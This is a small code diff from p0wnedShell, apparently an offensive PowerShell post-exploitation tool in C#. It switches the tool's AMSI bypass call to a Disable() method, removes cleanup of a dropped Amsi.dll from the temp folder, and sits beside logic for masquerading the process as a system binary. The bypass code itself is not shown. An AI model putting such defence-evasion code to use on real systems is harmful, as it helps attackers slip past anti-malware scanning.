@@ -347,7 +347,7 @@ namespace p0wnedShell
                 string MasqPath = p0wnedShellOpsec.masqBinary.Remove(p0wnedShellOpsec.masqBinary.LastIndexOf(@"\")).ToLower();
                 string SystemPath = Environment.SystemDirectory.ToLower();
 
-                AmsiBypass.Amsi(Arch);
+                AmsiBypass.Disable();
                 if (p0wnedShellOpsec.AutoMasq && MasqPath == SystemPath)
                 {
                     // Starting Runspace before we Masquerade our Process
@@ -454,12 +454,6 @@ namespace p0wnedShell
                 }
 
             } while (userInput != 19);
-
-            string TempFolder = Path.GetTempPath();
-            if (File.Exists(TempFolder + "\\Amsi.dll"))
-            {
-                File.Delete(TempFolder + "\\Amsi.dll");
-            }
         }
     }
 
